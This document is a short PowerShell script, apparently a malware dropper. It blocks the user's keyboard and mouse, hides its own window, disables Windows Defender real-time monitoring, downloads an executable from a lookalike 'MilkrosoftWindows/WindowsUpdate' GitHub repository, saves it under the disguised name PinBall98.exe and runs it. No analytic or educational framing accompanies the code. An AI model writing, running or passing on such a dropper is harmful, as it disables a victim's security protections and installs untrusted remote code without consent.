Add-Type -AssemblyName presentationCore
Add-Type -AssemblyName System.Windows.Forms

$SignatureBlockInput = @"
  [DllImport("user32.dll")]
  public static extern bool BlockInput(bool fBlockIt);
"@

$UserInput = Add-Type -MemberDefinition $SignatureBlockInput -Name "UserInput" -PassThru

$SignatureShowWindowAsync = @"
  [DllImport("user32.dll")]
  public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);
"@

$ShowWindowAsync = Add-Type -MemberDefinition $SignatureShowWindowAsync -Name "Window" -PassThru

$UserInput::BlockInput($true) | Out-Null
$ShowWindowAsync::ShowWindowAsync((Get-Process -Id $pid).MainWindowHandle, 2) | Out-Null

Set-MpPreference -DisableRealtimeMonitoring $true

mkdir $home\SystemFiles

$WebClient = New-Object System.Net.WebClient
$WebClient.DownloadFile('https://github.com/MilkrosoftWindows/WindowsUpdate/raw/warni/warni.exe', $home+'\SystemFiles\PinBall98.exe')

start $home\SystemFiles\PinBall98.exe

$UserInput::BlockInput($false) | Out-Null
exit
